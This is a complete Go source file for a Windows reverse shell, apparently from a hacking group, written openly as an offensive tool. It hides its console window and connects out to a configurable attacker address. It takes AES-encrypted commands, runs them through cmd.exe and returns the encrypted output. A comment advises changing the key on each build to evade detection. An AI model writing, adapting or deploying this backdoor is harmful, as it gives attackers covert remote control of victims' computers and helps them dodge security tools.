package main
// coded by s1ege greetz to all GSH members
import (
  "github.com/gonutz/w32"
  "net"
  "os"
  "os/exec"
  "strings"
  "crypto/aes"
  "crypto/cipher"
  "encoding/base64"
  "fmt"
)

const buf = 1024
// enter ip/port below
const ip_port = "127.0.0.1:4444"

func main() {
    console := w32.GetConsoleWindow()
    if console != 0 {
        _, consoleProcID := w32.GetWindowThreadProcessId(console)
        if w32.GetCurrentProcessId() == consoleProcID {
            w32.ShowWindowAsync(console, w32.SW_HIDE)
        }
    }

    conn, _ := net.Dial("tcp", ip_port)
    run_shell(conn)
}

func run_shell(conn net.Conn) {
    // enter 32 byte long key here (change per each build to evade detection/decryption)
    key := []byte("024iF4ciIdeXt9Yxk9C97QsrNrxNXzEi")
    var cmd_buf []byte
    cmd_buf = make([]byte, buf)
    for {
        receivedBytes, _ := conn.Read(cmd_buf[0:])
        enc_command := string(cmd_buf[0:receivedBytes])
        byte_command := encryption(false, key, enc_command)
        command := string(byte_command)
        if strings.Index(command, "exit") == 0 {
            conn.Close()
            os.Exit(0)

        } else {
            shell_arg := []string{"/C", command}
            execcmd := exec.Command("cmd", shell_arg...)

            cmdout, _ := execcmd.Output()
            enc_cmdout := encryption(true, key, string(cmdout))
            output := string(enc_cmdout) + "\n"
            conn.Write([]byte(output))
        }
    }
}

func encryption(encrypt bool, key []byte, message string) (result string) {
    // encrypts message if the encrypt bool is true else decrypts
    if encrypt{
        plainText := []byte(message)
        block, _ := aes.NewCipher(key)
 
        cipherText := make([]byte, aes.BlockSize+len(plainText))
        iv := cipherText[:aes.BlockSize]

        stream := cipher.NewCFBEncrypter(block, iv)
        stream.XORKeyStream(cipherText[aes.BlockSize:], plainText)

        result = base64.URLEncoding.EncodeToString(cipherText)

    } else {
        cipherText, _ := base64.URLEncoding.DecodeString(message)
        block, _ := aes.NewCipher(key)

        iv := cipherText[:aes.BlockSize]
        cipherText = cipherText[aes.BlockSize:]

        stream := cipher.NewCFBDecrypter(block, iv)
        stream.XORKeyStream(cipherText, cipherText)

        result = string(cipherText)
    }
    return
}
